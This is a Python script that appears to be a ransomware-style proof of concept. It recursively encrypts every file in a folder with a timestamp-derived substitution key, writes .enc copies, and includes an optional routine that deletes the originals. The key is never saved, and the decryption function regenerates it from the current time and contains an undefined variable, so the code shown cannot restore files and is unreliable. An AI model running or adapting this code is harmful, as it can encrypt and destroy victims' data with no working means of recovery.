import os
import hashlib
import base64
from datetime import datetime
from tqdm import tqdm

def generate_time_based_key():
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S").encode()
    return hashlib.sha256(timestamp).digest()

def generate_key_from_string(input_string):
    return hashlib.sha256(input_string.encode()).digest()

def create_hashmap(key):
    hashmap = {}
    for i in range(256):
        hashmap[i] = (i + key[i % len(key)]) % 256
    return hashmap

def create_decrypt_hashmap(hashmap):
    decrypt_hashmap = {}
    for original, encrypted in hashmap.items():
        decrypt_hashmap[encrypted] = original
    return decrypt_hashmap

def encrypt_data(data, hashmap):
    encrypted_data = bytearray()
    for byte in data:
        encrypted_byte = hashmap[byte]
        encrypted_data.append(encrypted_byte)
    return encrypted_data

def decrypt_data(data, decrypt_hashmap):
    decrypted_data = bytearray()
    for byte in data:
        decrypted_byte = decrypt_hashmap[byte]
        decrypted_data.append(decrypted_byte)
    return decrypted_data

def encrypt_folder(folder_path):
    key = generate_time_based_key()
    hashmap = create_hashmap(key)

    file_paths = [os.path.join(root, file) for root, _, files in os.walk(folder_path) for file in files]

    for file_path in tqdm(file_paths, desc="Encrypting files", unit="file"):
        with open(file_path, 'rb') as f:
            original_data = f.read()

        encrypted_data = encrypt_data(original_data, hashmap)
        base64_encoded_data = base64.b64encode(encrypted_data)

        with open(file_path + '.enc', 'wb') as f:
            f.write(base64_encoded_data)

        print(f'[!] ENCRYPTED {file_path} to {file_path + ".enc"}')

def decrypt_folder(folder_path):
    file_paths = [os.path.join(root, file) for root, _, files in os.walk(folder_path) if file.endswith('.enc')]

    for file_path in tqdm(file_paths, desc="Decrypting files", unit="file"):
        with open(file_path, 'rb') as f:
            encrypted_data = base64.b64decode(f.read())

        key = generate_time_based_key()
        hashmap = create_hashmap(key)
        decrypt_hashmap = create_decrypt_hashmap(hashmap)

        decrypted_data = decrypt_data(encrypted_data, decrypt_hashmap)

        original_file_path = file_path[:-4]  # Remove '.enc' extension
        with open(original_file_path, 'wb') as f:
            f.write(decrypted_data)

        print(f'[!] DECRYPTED {file_path} to {original_file_path}')

def get_file_size(file_path):
    return os.path.getsize(file_path)

def delete_original_files(folder_path):
    file_paths = [os.path.join(root, file) for root, _, files in os.walk(folder_path)]
    for file_path in file_paths:
        if not file_path.endswith('.enc'):
            os.remove(file_path)
            print(f'[!] DELETED ORIGINAL FILE: {file_path}')

def validate_files(original_folder, encrypted_folder):
    original_files = [f for f in os.listdir(original_folder) if os.path.isfile(os.path.join(original_folder, f))]
    encrypted_files = [f for f in os.listdir(encrypted_folder) if f.endswith('.enc')]
    
    if len(original_files) != len(encrypted_files):
        return False
    return True

def log_encryption(folder_path):
    with open("encryption_log.txt", "a") as log_file:
        log_file.write(f'{datetime.now()} - Encrypted files in {folder_path}\n')

def log_decryption(folder_path):
    with open("decryption_log.txt", "a") as log_file:
        log_file.write(f'{datetime.now()} - Decrypted files in {folder_path}\n')

def get_encrypted_file_count(folder_path):
    return len([f for f in os.listdir(folder_path) if f.endswith('.enc')])

# Usage Example
folder_to_encrypt = 'POC'
encrypt_folder(folder_to_encrypt)
log_encryption(folder_to_encrypt)

# Uncomment to delete original files after encryption
# delete_original_files(folder_to_encrypt)

# Decrypting files (Example - Uncomment to run)
# decrypt_folder(folder_to_encrypt)
# log_decryption(folder_to_encrypt)

# Validate the encryption/decryption process
# if validate_files(folder_to_encrypt, folder_to_encrypt):
#     print("All files validated successfully.")
# else:
#     print("Files validation failed.")
